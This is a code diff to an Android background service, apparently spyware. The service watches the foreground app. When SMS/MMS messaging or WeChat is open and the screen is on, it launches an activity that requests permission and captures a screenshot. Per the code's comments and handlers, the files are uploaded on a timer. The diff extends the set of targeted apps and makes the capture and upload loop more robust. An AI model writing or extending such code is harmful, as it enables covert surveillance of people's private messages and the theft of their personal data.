@@ -18,6 +18,7 @@ import android.os.Environment;
 import android.os.Handler;
 import android.os.HandlerThread;
 import android.os.IBinder;
+import android.os.PowerManager;
 import android.os.Process;
 import android.util.Log;
 
@@ -55,12 +56,11 @@ public class RecordService extends Service {
 
     public final static String TAG = "DaemonService";
 
-    private String  currentAppName = "";
+    public String  currentAppName = "";
 
-    private long mUploadDaleyMillis = 15000; // 上传时间/毫秒
-    private long mRecordDaleyMillis = 10000; // 截图时间/毫秒
+    public long mUploadDaleyMillis = 15000; // 上传时间/毫秒
+    public long mRecordDaleyMillis = 10000; // 截图时间/毫秒
     private String mSaveImageDir = Environment.getExternalStorageDirectory().getPath()+"/Pictures/";
-
 
 
     @Override
@@ -233,14 +233,26 @@ public class RecordService extends Service {
                 //Log.d(TAG,"定时函数");
 
                 // 获取topApp包名
-                getTopApp(RecordService.this);
+                getTopApp();
 
                 // 定时x秒，调用Activity，当Activity被激活的时候，自动开始申请权限，并截图
-                if(currentAppName.contains("com.android.messaging") || currentAppName.contains("com.tencent.mm")){
-                    Intent localIntent = new Intent();
-                    localIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
-                    localIntent.setClass(RecordService.this,MainActivity.class);
-                    startActivity(localIntent);
+                if(currentAppName.contains("com.android.messaging") ||currentAppName.contains("com.android.mms")|| currentAppName.contains("com.tencent.mm")){
+
+                    PowerManager pm= (PowerManager) RecordService.this.getSystemService(Context.POWER_SERVICE);
+
+                    // 屏幕开启状态
+                    if(pm.isScreenOn())
+                    {
+                        Intent localIntent = new Intent();
+                        localIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
+                        localIntent.setClass(RecordService.this,MainActivity.class);
+                        startActivity(localIntent);
+                    }
+                    else
+                    {
+                        Log.d(TAG,"Screen if off status");
+                    }
+
                 }
 
                 // 延迟x秒，重复执行run函数
@@ -322,15 +334,20 @@ public class RecordService extends Service {
 
             @Override
             public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                Log.d(TAG,"上传文件失败, 错误原因："+new String(responseBody));
-                error.printStackTrace();
+                try {
+                    Log.d(TAG,"上传文件失败, 错误原因：");
+                    error.printStackTrace();
+                }catch (NullPointerException argE){
+
+                }
+
             }
         });
     }
 
-    private void getTopApp(Context context) {
+    public void getTopApp() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-            UsageStatsManager m = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
+            UsageStatsManager m = (UsageStatsManager) getSystemService(Context.USAGE_STATS_SERVICE);
             if (m != null) {
                 long now = System.currentTimeMillis();
                 //获取60秒之内的应用数据
@@ -370,8 +387,11 @@ public class RecordService extends Service {
 
             @Override
             public void onFailure(int statusCode, Header[] headers, byte[] responseBody, Throwable error) {
-                Log.d(TAG,new String(responseBody));
-                error.printStackTrace();
+                try {
+                    Log.d(TAG,new String(responseBody));
+                    error.printStackTrace();
+                }catch (NullPointerException argE){}
+
             }
         });
     }
